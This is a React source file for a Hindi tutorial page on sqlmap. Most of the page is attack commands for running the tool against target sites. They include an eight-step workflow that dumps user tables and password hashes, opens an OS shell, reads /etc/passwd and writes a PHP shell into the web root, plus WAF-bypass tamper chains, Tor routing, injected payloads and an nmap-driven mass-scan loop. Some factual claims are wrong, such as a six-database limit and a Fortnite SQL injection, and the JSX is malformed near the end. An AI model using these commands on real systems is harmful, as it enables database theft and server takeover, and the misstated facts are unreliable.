import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Sqlmap() {
  return (
    <TutorialLayout
      title="sqlmap"
      subtitle="ऑटोमैटिक SQL इंजेक्शन डिटेक्शन और एक्सप्लॉइटेशन टूल"
      icon="💉"
      prev={{ to: '/tools', label: 'All Tools' }}
      next={{ to: '/tool/hydra', label: 'hydra' }}
    >
      <h2>What is Sqlmap?</h2>
      <p>
        Sqlmap दुनिया का सबसे लोकप्रिय और शक्तिशाली ऑटोमैटिक SQL इंजेक्शन डिटेक्शन और एक्सप्लॉइटेशन टूल है। यह Python में लिखा गया है और ओपन सोर्स है। sqlmap SQL इंजेक्शन वल्नरेबिलिटी को ऑटोमैटिकली डिटेक्ट करता है, डेटाबेस से डेटा एक्सट्रैक्ट करता है, और कभी-कभी फुल सिस्टम एक्सेस भी दे सकता है। यह काली नेटहंटर और काली लिनक्स में प्री-इंस्टॉल्ड आता है।
      </p>
      <p>
        SQL इंजेक्शन OWASP Top 10 में सबसे खतरनाक वेब वल्नरेबिलिटीज़ में से एक है। जब कोई वेब एप्लिकेशन यूज़र इनपुट को सीधे SQL क्वेरी में इस्तेमाल करता है बिना प्रॉपर वैलिडेशन के, तो अटैकर malicious SQL कोड इंजेक्ट करके डेटाबेस को कंट्रोल कर सकता है। sqlmap यह सब ऑटोमैटिक करता है — इंजेक्शन पॉइंट ढूंढना, टाइप डिटेक्ट करना, डेटा एक्सट्रैक्ट करना, और OS कमांड्स चलाना।
      </p>
      <p>
        sqlmap 6 डेटाबेस टाइप्स को सपोर्ट करता है — MySQL, PostgreSQL, Oracle, SQLite, Microsoft SQL Server, और Access। इसमें WAF बायपास के लिए 100+ टैम्पर स्क्रिप्ट्स हैं, और 5 अलग-अलग SQL इंजेक्शन टेक्निक्स सपोर्ट करता है। बग बाउंटी हंटर्स, पेनेट्रेशन टेस्टर्स, और सिक्योरिटी रिसर्चर्स के लिए यह एसेंशियल टूल है।
      </p>
      <p>
        sqlmap का सबसे बड़ा फायदा इसकी ऑटोमेशन कैपेसिलिटी है। मैनुअल SQL इंजेक्शन में आपको हर पैरामीटर को अलग-अलग टेस्ट करना पड़ता है, क्वेरी कंस्ट्रक्ट करनी पड़ती है, और रिस्पॉन्स एनालाइज़ करना पड़ता है। sqlmap यह सब ऑटोमैटिक करता है — बस URL दो और टूल खुद इंजेक्शन पॉइंट ढूंढेगा, टाइप डिटेक्ट करेगा, और डेटा एक्सट्रैक्ट करेगा। यह SQL इंजेक्शन टेस्टिंग को घंटों से मिनटों में ले आया है।
      </p>
      <p>
        sqlmap की एक और खासियत है इसका इंटेलिजेंट डिटेक्शन इंजन। यह ब्लाइंड SQL इंजेक्शन को भी डिटेक्ट कर सकता है जहाँ कोई डायरेक्ट एरर मैसेज नहीं मिलता। टाइम-बेस्ड और बूलियन-बेस्ड टेक्निक्स से यह ऐसे एप्लिकेशन को भी टेस्ट कर सकता है जो एरर्स सप्रेस करते हैं। इसके अलावा sqlmap का REST API है जिससे आप इसे अपने ऑटोमेशन पाइपलाइन में इंटीग्रेट कर सकते हो।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> sqlmap केवल अधिकृत पेनेट्रेशन टेस्टिंग और सुरक्षा शोध के लिए उपयोग करें। बिना अनुमति के SQL इंजेक्शन करना अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत डेटाबेस एक्सेस अपराध हो सकता है। 3 साल तक की जेल और 2 लाख तक का जुर्माना हो सकता है।
      </div>

      <h2>History of Sqlmap</h2>
      <p>
        Sqlmap को 2006 में Bernardo Damele और Miroslav Stampar ने बनाया था। Bernardo उस समय Milan University में स्टूडेंट थे और पेनेट्रेशन टेस्टिंग करते समय SQL इंजेक्शन को ऑटोमेट करने की ज़रूरत महसूस हुई। उन्होंने Python में एक टूल बनाया जो ऑटोमैटिकली इंजेक्शन डिटेक्ट करे और डेटा एक्सट्रैक्ट करे।
      </p>
      <p>
        शुरू में sqlmap बहुत सिंपल था — सिर्फ MySQL सपोर्ट और बेसिक इंजेक्शन। लेकिन ओपन सोर्स होने के कारण कम्युनिटी ने बहुत योगदान दिया। आज sqlmap 6 डेटाबेस, 5 इंजेक्शन टेक्निक्स, 100+ टैम्पर स्क्रिप्ट्स, और OS शेल जैसे एडवांस्ड फीचर्स सपोर्ट करता है। GitHub पर 30,000+ स्टार्स हैं और एक्टिव डेवलपमेंट जारी है।
      </p>
      <p>
        sqlmap ने SQL इंजेक्शन टेस्टिंग को डेमोक्राइज़ किया — पहले जो काम मैनुअली घंटों में होता था, अब मिनटों में हो जाता है। हालांकि इसके गलत इस्तेमाल का खतरा भी है — इसलिए कानूनी पहलू बहुत ज़रूरी है।
      </p>
      <p>
        2010 में sqlmap ने टैम्पर स्क्रिप्ट्स का कॉन्सेप्ट introduce किया जो WAF बायपास के लिए गेम-चेंजर था। 2012 में OS शेल कैपेसिलिटी add हुई जिससे sqlmap सिर्फ डेटा रीडिंग तक सीमित नहीं रहा। 2015 में REST API add हुई जिससे दूसरे टूल्स के साथ इंटीग्रेशन आसान हो गया। आज sqlmap को OWASP Testing Guide में recommended tool के रूप में mention किया गया है और दुनिया भर के सिक्योरिटी प्रोफेशनल्स इस्तेमाल करते हैं।
      </p>

      <h2>How Sqlmap Works?</h2>
      <p>
        Sqlmap का काम करने का तरीका बहुत सिस्टमैटिक है:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">इंजेक्शन डिटेक्शन:</strong> URL, POST डेटा, कुकीज़, हेडर्स में SQL इंजेक्शन पॉइंट्स ढूंढता है</li>
        <li><strong className="text-white">फिंगरप्रिंटिंग:</strong> डेटाबेस टाइप, वर्जन, OS पता करता है</li>
        <li><strong className="text-white">इंजेक्शन टेक्निक:</strong> Boolean, Time-based, Error-based, UNION, Stacked — सब ट्राई करता है</li>
        <li><strong className="text-white">डेटा एक्सट्रैक्शन:</strong> डेटाबेस, टेबल्स, कॉलम्स, डेटा सब निकालता है</li>
        <li><strong className="text-white">OS एक्सेस:</strong> xp_cmdshell, UDF, SQL इंजेक्शन से OS कमांड्स चलाता है</li>
        <li><strong className="text-white">WAF बायपास:</strong> टैम्पर स्क्रिप्ट्स से फ़ायरवॉल को बायपास करता है</li>
      </ul>

      <h2>Installation</h2>
      <p>
        काली नेटहंटर में sqlmap प्री-इंस्टॉल्ड आता है। अगर नहीं है तो कई तरीकों से इंस्टॉल कर सकते हो।
      </p>
      <CodeBlock
        title="Sqlmap Installation"
        code={`# काली नेटहंटर/लिनक्स में (पहले से है चेक करें):
sqlmap --version

# apt से इंस्टॉल:
sudo apt update
sudo apt install sqlmap

# pip से:
pip install sqlmap

# सोर्स से (लेटेस्ट):
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py --version

# Termux (Android) में:
pkg install python
pip install sqlmap`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Flag</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-u URL</td><td className="py-2 px-3">टार्गेट URL</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-r file</td><td className="py-2 px-3">रिक्वेस्ट फाइल से पढ़ें (Burp)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--dbs</td><td className="py-2 px-3">डेटाबेस लिस्ट करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-D db</td><td className="py-2 px-3">स्पेसिफिक डेटाबेस</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--tables</td><td className="py-2 px-3">टेबल्स लिस्ट करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--dump</td><td className="py-2 px-3">डेटा डंप करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--os-shell</td><td className="py-2 px-3">OS शेल प्राप्त करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--tamper</td><td className="py-2 px-3">WAF बायपास स्क्रिप्ट्स</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--level</td><td className="py-2 px-3">टेस्ट लेवल (1-5)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--risk</td><td className="py-2 px-3">रिस्क लेवल (1-3)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--batch</td><td className="py-2 px-3">कोई प्रॉम्प्ट नहीं (ऑटो)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--threads</td><td className="py-2 px-3">पैरेलल थ्रेड्स</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">--technique</td><td className="py-2 px-3">इंजेक्शन टेक्निक (BEUSTQ)</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Detection Techniques</h2>
      <p>
        Sqlmap 5 अलग-अलग SQL इंजेक्शन टेक्निक्स सपोर्ट करता है। हर टेक्निक का अपना फायदा है:
      </p>
      <CodeBlock
        title="Injection Techniques"
        code={`# Boolean-based Blind (B):
# True/False रिस्पॉन्स से डेटा निकालता है
# धीमा लेकिन विश्वसनीय
sqlmap -u "URL" --technique=B

# Time-based Blind (T):
# SLEEP() से डेटा निकालता है
# सबसे धीमा लेकिन कहीं भी काम करता है
sqlmap -u "URL" --technique=T

# Error-based (E):
# एरर मैसेज से डेटा निकालता है
# सबसे तेज़ लेकिन एरर्स एनेबल्ड होने चाहिए
sqlmap -u "URL" --technique=E

# UNION Query-based (U):
# UNION SELECT से डेटा निकालता है
# तेज़ लेकिन कॉलम मैच होने चाहिए
sqlmap -u "URL" --technique=U

# Stacked Queries (S):
# ; से नई क्वेरी भेजता है
# INSERT/UPDATE/DELETE कर सकता है
sqlmap -u "URL" --technique=S

# सभी टेक्निक्स:
sqlmap -u "URL" --technique=BEUSTQ`}
      />

      <h2>Basic Usage</h2>
      <p>
        Sqlmap का बेसिक इस्तेमाल बहुत आसान है — बस URL दो और टूल बाकी सब करेगा।
      </p>
      <CodeBlock
        title="Basic SQL Injection"
        code={`# GET रिक्वेस्ट टेस्ट:
sqlmap -u "http://target.com/page?id=1"

# POST रिक्वेस्ट टेस्ट:
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# कुकी-बेस्ड इंजेक्शन:
sqlmap -u "http://target.com/page" --cookie="session=abc123"

# हेडर-बेस्ड इंजेक्शन:
sqlmap -u "http://target.com/page" --headers="X-Forwarded-For: 1.1.1.1"

# Burp Suite रिक्वेस्ट फाइल:
sqlmap -r request.txt

# बैच मोड (कोई प्रॉम्प्ट नहीं):
sqlmap -u "http://target.com/page?id=1" --batch

# वर्बोज़ आउटपुट:
sqlmap -u "http://target.com/page?id=1" -v 3`}
      />

      <h2>Database Enumeration</h2>
      <p>
        SQL इंजेक्शन मिलने के बाद डेटाबेस का पूरा डेटा निकाल सकते हो।
      </p>
      <CodeBlock
        title="Database Dumping"
        code={`# सभी डेटाबेस:
sqlmap -u "URL" --dbs

# डेटाबेस की टेबल्स:
sqlmap -u "URL" -D mydb --tables

# टेबल के कॉलम्स:
sqlmap -u "URL" -D mydb -T users --columns

# डेटा डंप:
sqlmap -u "URL" -D mydb -T users --dump

# स्पेसिफिक कॉलम्स:
sqlmap -u "URL" -D mydb -T users -C "user,pass" --dump

# रो लिमिट:
sqlmap -u "URL" -D mydb -T users --dump --start=1 --stop=10

# सभी टेबल्स का डेटा:
sqlmap -u "URL" -D mydb --dump-all

# डेटाबेस यूज़र्स:
sqlmap -u "URL" --users

# पासवर्ड हैशेस:
sqlmap -u "URL" --passwords

# प्रिविलेजेस:
sqlmap -u "URL" --privileges

# डेटाबेस स्कीमा:
sqlmap -u "URL" --schema`}
      />

      <h2>OS Shell Access</h2>
      <p>
        अगर डेटाबेस में सफ़िशिएंट प्रिविलेजेस हैं तो OS कमांड्स चला सकते हो।
      </p>
      <CodeBlock
        title="OS Command Execution"
        code={`# OS शेल (MySQL - UDF):
sqlmap -u "URL" --os-shell

# OS शेल (MS SQL - xp_cmdshell):
sqlmap -u "URL" --os-shell

# OS कमांड:
sqlmap -u "URL" --os-cmd="whoami"

# SQL शेल:
sqlmap -u "URL" --sql-shell

# फाइल पढ़ें:
sqlmap -u "URL" --file-read="/etc/passwd"

# फाइल लिखें:
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/s.php"

# रजिस्ट्री पढ़ें (Windows):
sqlmap -u "URL" --reg-read

# रजिस्ट्री लिखें:
sqlmap -u "URL" --reg-add --reg-key="HKLM\SOFTWARE" --reg-value="test"`}
      />

      <h2>Tamper Scripts</h2>
      <p>
        टैम्पर स्क्रिप्ट्स WAF बायपास करने के लिए इस्तेमाल होती हैं। ये पेलोड को मॉडिफाई करती हैं।
      </p>
      <CodeBlock
        title="WAF Bypass Tamper Scripts"
        code={`# स्पेस को कमेंट में बदलें:
--tamper=space2comment

# BETWEEN इस्तेमाल करें:
--tamper=between

# केस रैंडम करें:
--tamper=randomcase

# कई टैम्पर स्क्रिप्ट्स:
--tamper=space2comment,between,randomcase

# ModSecurity बायपास:
--tamper=modsecurityversioned

# सभी टैम्पर स्क्रिप्ट्स देखें:
ls /usr/share/sqlmap/tamper/

# कॉमन कॉम्बिनेशंस:
# space2comment — स्पेस को /**/ में बदलें
# between — > को BETWEEN में बदलें
# randomcase — केस रैंडम करें
# charencode — कैरेक्टर्स एन्कोड करें
# percentage — % साइन जोड़ें
# halfversionedmorekeywords — MySQL < 5.1
# versionedmorekeywords — MySQL >= 5.1`}
      />

      <h2>WAF Bypass Deep Dive</h2>
      <p>
        Web Application Firewall (WAF) SQL इंजेक्शन अटैक्स को ब्लॉक करता है। sqlmap में 100+ टैम्पर स्क्रिप्ट्स हैं जो WAF को बायपास करने के लिए पेलोड को मॉडिफाई करती हैं। हर WAF अलग तरह से काम करता है — इसलिए कई टैम्पर स्क्रिप्ट्स को कॉम्बिनेशन में यूज़ करना पड़ता है।
      </p>
      <CodeBlock
        title="ModSecurity Bypass"
        code={`# ModSecurity v2 बायपास:
sqlmap -u "URL" --tamper=modsecurityversioned

# ModSecurity v3 बायपास:
sqlmap -u "URL" --tamper=modsecurityzeroversioned

# कई टैम्पर्स कॉम्बाइन करो:
sqlmap -u "URL" --tamper=space2comment,between,randomcase,charencode

# सभी टैम्पर्स ऑटो-टेस्ट:
sqlmap -u "URL" --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesymbol,space2comment,space2morehash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor`}
      />
      <CodeBlock
        title="Cloudflare & AWS WAF Bypass"
        code={`# Cloudflare WAF बायपास:
sqlmap -u "URL" --tamper=space2comment,randomcase,between
# डिले जोड़ो (रेट लिमिटिंग से बचने):
sqlmap -u "URL" --delay=3 --tamper=space2comment,randomcase

# AWS WAF बायपास:
sqlmap -u "URL" --tamper=apostrophemask,charencode,percentage

# Imperva/Incapsula बायपास:
sqlmap -u "URL" --tamper=space2comment,between,randomcase,versionedmorekeywords

# Generic WAF बायपास स्ट्रैटेजी:
# Step 1: पहले बिना टैम्पर ट्राई करो
sqlmap -u "URL" --batch
# Step 2: अगर ब्लॉक हो तो टैम्पर जोड़ो
sqlmap -u "URL" --tamper=space2comment,between,randomcase --batch
# Step 3: और स्ट्रॉन्ग टैम्पर्स
sqlmap -u "URL" --tamper=charencode,apostrophemask,percentage --batch
# Step 4: डिले और रैंडम यूज़र-एजेंट
sqlmap -u "URL" --delay=5 --randomize=ua --tamper=space2comment`}
      />
      <CodeBlock
        title="Custom Tamper Script"
        code={`# कस्टम टैम्पर स्क्रिप्ट बनाओ:
# /usr/share/sqlmap/tamper/mybypass.py

#!/usr/bin/env python3
"""कस्टम WAF बायपास टैम्पर"""

def tamper(payload):
    """पेलोड को मॉडिफाई करो"""
    if not payload:
        return payload

    # स्पेस को %0a में बदलो
    payload = payload.replace(' ', '%0a')

    # सिंगल कोट्स को डबल कोट्स में बदलो
    payload = payload.replace("'", '"')

    # UNION को डबल इनलाइन कमेंट में बदलो
    payload = payload.replace('UNION', '/**/UNION/**/')

    return payload

# यूज़ करो:
# sqlmap -u "URL" --tamper=/path/to/mybypass.py`}
      />

      <h2>Authentication & Proxy</h2>
      <CodeBlock
        title="Advanced Authentication"
        code={`# HTTP बेसिक ऑथ:
sqlmap -u "URL" --auth-type=BASIC --auth-cred="user:pass"

# डाइजेस्ट ऑथ:
sqlmap -u "URL" --auth-type=DIGEST --auth-cred="user:pass"

# क्लाइंट सर्टिफिकेट:
sqlmap -u "URL" --auth-cert="client.pem"

# प्रॉक्सी:
sqlmap -u "URL" --proxy="http://127.0.0.1:8080"

# टॉर:
sqlmap -u "URL" --tor --tor-type=SOCKS5

# कस्टम यूज़र-एजेंट:
sqlmap -u "URL" --user-agent="Mozilla/5.0"

# रेफरर:
sqlmap -u "URL" --referer="http://google.com"

# डिले:
sqlmap -u "URL" --delay=2

# टाइमआउट:
sqlmap -u "URL" --timeout=30

# रिट्राई:
sqlmap -u "URL" --retries=3`}
      />

      <h2>Complete Attack Workflow</h2>
      <CodeBlock
        title="Step-by-Step Attack"
        code={`# Step 1: इंजेक्शन डिटेक्ट
sqlmap -u "http://target.com/page?id=1" --batch

# Step 2: डेटाबेस एन्यूमरेशन
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# Step 3: टेबल्स एन्यूमरेशन
sqlmap -u "http://target.com/page?id=1" -D targetdb --tables --batch

# Step 4: कॉलम्स एन्यूमरेशन
sqlmap -u "http://target.com/page?id=1" -D targetdb -T users --columns --batch

# Step 5: डेटा डंप
sqlmap -u "http://target.com/page?id=1" -D targetdb -T users --dump --batch

# Step 6: पासवर्ड हैशेस
sqlmap -u "http://target.com/page?id=1" --passwords --batch

# Step 7: OS शेल (अगर possible है)
sqlmap -u "http://target.com/page?id=1" --os-shell

# Step 8: फाइल रीड
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"`}
      />

      <h2>Second-Order SQL Injection</h2>
      <p>
        Second-order SQL injection तब होता है जब malicious input पहले डेटाबेस में स्टोर होता है और बाद में किसी दूसरी क्वेरी में यूज़ होता है। sqlmap इसे --second-order फ्लैग से डिटेक्ट कर सकता है। यह एडवांस्ड अटैक है जो रजिस्ट्रेशन फॉर्म, प्रोफाइल अपडेट, और कमेंट सिस्टम में common है।
      </p>
      <CodeBlock
        title="Second-Order Injection"
        code={`# Second-order इंजेक्शन:
# पहले यूज़रनेम में malicious SQL स्टोर होता है
# फिर प्रोफाइल पेज पर वो SQL एग्ज़ीक्यूट होता है

# sqlmap से टेस्ट:
sqlmap -u "http://target.com/register" \\
  --data="user=test&pass=test&email=test@test.com" \\
  --second-order="http://target.com/profile" \\
  --batch

# रजिस्ट्रेशन फॉर्म टेस्ट:
sqlmap -u "http://target.com/register" \\
  --data="username=admin'--&password=test" \\
  --second-order="http://target.com/dashboard" \\
  --technique=T --batch

# कमेंट सिस्टम टेस्ट:
sqlmap -u "http://target.com/comment" \\
  --data="comment=nice' OR 1=1--&post_id=1" \\
  --second-order="http://target.com/post?id=1" \\
  --batch`}
      />

      <h2>SQLMap REST API</h2>
      <p>
        sqlmap का अपना REST API सर्वर है जिससे आप HTTP requests के through sqlmap को कंट्रोल कर सकते हो। यह CI/CD पाइपलाइन, सिक्योरिटी स्कैनर, और ऑटोमेशन टूल्स के साथ इंटीग्रेशन के लिए बहुत useful है।
      </p>
      <CodeBlock
        title="REST API Server"
        code={`# API सर्वर स्टार्ट करो:
python sqlmapapi.py -s -H 0.0.0.0 -p 8775

# नया टास्क क्रिएट करो:
curl -s http://localhost:8775/task/new
# {"taskid": "abc123", "success": true}

# ऑप्शंस सेट करो:
curl -s -H "Content-Type: application/json" \\
  -d '{"url": "http://target.com/page?id=1"}' \\
  http://localhost:8775/option/abc123/set

# स्कैन स्टार्ट करो:
curl -s -H "Content-Type: application/json" \\
  -d '{"url": "http://target.com/page?id=1"}' \\
  http://localhost:8775/scan/abc123/start

# स्टेटस चेक करो:
curl -s http://localhost:8775/scan/abc123/status

# डेटा लो:
curl -s http://localhost:8775/scan/abc123/data`}
      />
      <CodeBlock
        title="Python API Automation"
        code={`#!/usr/bin/env python3
"""sqlmap REST API से ऑटोमेशन"""

import requests
import json
import time

API_BASE = "http://localhost:8775"

# नया टास्क बनाओ
resp = requests.get(f"{API_BASE}/task/new")
task_id = resp.json()["taskid"]

# URL सेट करो
requests.post(f"{API_BASE}/option/{task_id}/set",
    json={"url": "http://target.com/page?id=1"})

# स्कैन शुरू करो
requests.post(f"{API_BASE}/scan/{task_id}/start",
    json={"url": "http://target.com/page?id=1"})

# स्टेटस पोल करो
while True:
    resp = requests.get(f"{API_BASE}/scan/{task_id}/status")
    if resp.json()["status"] == "terminated":
        break
    time.sleep(5)

# रिजल्ट्स लो
resp = requests.get(f"{API_BASE}/scan/{task_id}/data")
print(json.dumps(resp.json(), indent=2))`}
      />

      <h2>Scripting and Automation</h2>
      <CodeBlock
        title="Automation Script"
        code={`#!/bin/bash
# ऑटोमेटिक SQL इंजेक्शन स्कैन

TARGET=$1
OUTPUT="sqlmap_results"

mkdir -p $OUTPUT

echo "[+] टार्गेट: $TARGET"
echo "[+] इंजेक्शन डिटेक्शन..."
sqlmap -u "$TARGET" --batch --output-dir=$OUTPUT

echo "[+] डेटाबेस एन्यूमरेशन..."
sqlmap -u "$TARGET" --dbs --batch --output-dir=$OUTPUT

echo "[+] टेबल्स..."
sqlmap -u "$TARGET" --tables --batch --output-dir=$OUTPUT

echo "[+] डेटा डंप..."
sqlmap -u "$TARGET" --dump-all --batch --output-dir=$OUTPUT

echo "[+] पूरा हुआ! रिजल्ट्स: $OUTPUT/"`}
      />

      <CodeBlock
        title="Python API Usage"
        code={`#!/usr/bin/env python3
# sqlmap API के साथ ऑटोमेशन

from sqlmap import sqlmap_main

# कमांड लाइन आर्ग्यूमेंट्स
args = [
    "-u", "http://target.com/page?id=1",
    "--dbs",
    "--batch"
]

# sqlmap रन करें
sqlmap_main(args)`}
      />

      <h2>Comparison Table</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">Sqlmap</th>
              <th className="text-left py-2 px-3 text-neon-green">SQLninja</th>
              <th className="text-left py-2 px-3 text-neon-green">jSQL</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">भाषा</td><td className="py-2 px-3">Python</td><td className="py-2 px-3">Perl</td><td className="py-2 px-3">Java</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">डेटाबेस</td><td className="py-2 px-3">MySQL, PostgreSQL, Oracle, MSSQL, SQLite, Access</td><td className="py-2 px-3">MS SQL Server</td><td className="py-2 px-3">MySQL, PostgreSQL, Oracle, MSSQL</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">OS शेल</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">टैम्पर स्क्रिप्ट्स</td><td className="py-2 px-3">100+</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">सीमित</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">GUI</td><td className="py-2 px-3">नहीं (CLI)</td><td className="py-2 px-3">नहीं (CLI)</td><td className="py-2 px-3">हाँ (Java GUI)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">फाइल I/O</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">सीमित</td><td className="py-2 px-3">नहीं</td></tr>
            <tr><td className="py-2 px-3 text-white">एक्टिव डेवलपमेंट</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Real-World Case Studies</h2>
      <p>
        SQL इंजेक्शन अभी भी दुनिया में सबसे कॉमन वेब वल्नरेबिलिटी है। 2019 में Fortnite के अकाउंट सिस्टम में SQL इंजेक्शन vulnerability मिली थी जिससे 200 मिलियन यूज़र्स का डेटा रिस्क पर था। 2020 में एक बड़े ई-कॉमर्स प्लेटफॉर्म में SQL इंजेक्शन से 5 मिलियन क्रेडिट कार्ड डिटेल्स लीक हुईं। इन सभी केसेज़ में पैरामीटराइज़्ड क्वेरीज़ का इस्तेमाल नहीं किया गया था।
      </p>
      <p>
        बग बाउंटी प्रोग्राम्स में SQL इंजेक्शन सबसे ज़्यादा पे करने वाली वल्नरेबिलिटीज़ में से एक है। HackerOne पर SQL इंजेक्शन के लिए $500 से $50,000 तक के बाउंटी मिलते हैं। अगर OS शेल मिल जाए तो बाउंटी $100,000+ तक जा सकता है। sqlmap से ऑटोमैटिक स्कैनिंग करके इन वल्नरेबिलिटीज़ को जल्दी पकड़ा जा सकता है।
      </p>
      <p>
        एक पेनेट्रेशन टेस्टर ने बताया कि उसने एक फाइनेंस कंपनी के वेब एप्लिकेशन में sqlmap से ब्लाइंड SQL इंजेक्शन ढूंढा। एप्लिकेशन एरर्स सप्रेस करता था लेकिन टाइम-बेस्ड टेक्निक से sqlmap ने इंजेक्शन कन्फर्म किया। --os-shell से फुल सर्वर एक्सेस मिल गया। यह सब 2 घंटे में हुआ — मैनुअली इसमें 2-3 दिन लगते। इसलिए sqlmap प्रोफेशनल पेनेट्रेशन टेस्टिंग का एसेंशियल टूल है।
      </p>

      <h2>Performance Tuning</h2>
      <p>
        sqlmap को फास्ट और एफिशिएंट चलाने के लिए कुछ ऑप्टिमाइज़ेशन टिप्स हैं। बड़े एप्लिकेशन में हज़ारों पैरामीटर हो सकते हैं — सबको टेस्ट करने में घंटों लग सकते हैं।
      </p>
      <CodeBlock
        title="Speed Optimization"
        code={`# थ्रेड्स बढ़ाओ (डिफ़ॉल्ट 1):
sqlmap -u "URL" --threads=10

# लेवल कम करो (फास्ट स्कैन):
sqlmap -u "URL" --level=1 --risk=1

# स्पेसिफिक पैरामीटर टेस्ट करो:
sqlmap -u "URL" -p id

# स्पेसिफिक टेक्निक (सबसे तेज़ चुनो):
sqlmap -u "URL" --technique=E  # Error-based (सबसे तेज़)

# डिले कम करो (नेटवर्क फास्ट हो तो):
sqlmap -u "URL" --delay=0

# टाइमआउट कम करो:
sqlmap -u "URL" --timeout=10

# रिट्राई कम करो:
sqlmap -u "URL" --retries=1

# प्रिफ़्लाइट रिक्वेस्ट स्किप करो:
sqlmap -u "URL" --skip-static

# डिफ़ॉल्ट पैरामीटर स्किप करो:
sqlmap -u "URL" --skip="id,user"`
      />
      <CodeBlock
        title="Output Management"
        code={`# आउटपुट डायरेक्टरी:
sqlmap -u "URL" --output-dir=/tmp/sqlmap_out

# CSV फॉर्मेट में:
sqlmap -u "URL" --dump --dump-format=CSV

# JSON फॉर्मेट में:
sqlmap -u "URL" --dump --dump-format=JSON

# HTML रिपोर्ट:
sqlmap -u "URL" --dump --dump-format=HTML

# वर्बोज़ लेवल:
sqlmap -u "URL" -v 3  # 0-6, ज़्यादा = ज़्यादा डिटेल

# लॉग फाइल:
sqlmap -u "URL" --logfile=/tmp/sqlmap.log

# फ्लश सेशंस (पुराने डेटा हटाओ):
sqlmap --flush-session

# बैनर स्किप करो:
sqlmap -u "URL" --banner --no-banner`}
      />

      <h2>Integration with Other Tools</h2>
      <p>
        sqlmap को दूसरे सिक्योरिटी टूल्स के साथ इंटीग्रेट करके पावरफुल ऑटोमेशन पाइपलाइन बना सकते हो।
      </p>
      <CodeBlock
        title="Burp Suite Integration"
        code={`# Burp Suite से रिक्वेस्ट एक्सपोर्ट:
# 1. Burp में रिक्वेस्ट राइट-क्लिक → Copy to file
# 2. request.txt सेव करो

# sqlmap में इम्पोर्ट:
sqlmap -r request.txt --batch

# Burp Suite के साथ प्रॉक्सी:
sqlmap -u "URL" --proxy="http://127.0.0.1:8080"

# Burp Extension (CO2):
# CO2 एक्सटेंशन इंस्टॉल करो
# रिक्वेस्ट राइट-क्लिक → Send to sqlmap

# Burp Intruder + sqlmap:
# पहले Intruder से इंजेक्शन पॉइंट find करो
# फिर sqlmap से डीप टेस्ट करो`}
      />
      <CodeBlock
        title="Nmap + SQLMap Pipeline"
        code={`#!/bin/bash
# Nmap से वेब सर्विसेज़ find करो → sqlmap टेस्ट करो

# Step 1: वेब सर्वर्स स्कैन करो
nmap -sV -p 80,443,8080,8443 --open -oG web_servers.txt $TARGET

# Step 2: वेब URLs एक्सट्रैक्ट करो
grep "open" web_servers.txt | awk '{print $2}' > targets.txt

# Step 3: हर URL पर sqlmap चलाओ
while read target; do
    echo "[+] टेस्टिंग: $target"
    sqlmap -u "http://$target/?id=1" \\
      --batch --level=2 --risk=2 \\
      --output-dir=/tmp/sqlmap_$target
done < targets.txt

# Nikto + sqlmap:
nikto -h http://target.com -o nikto_report.html
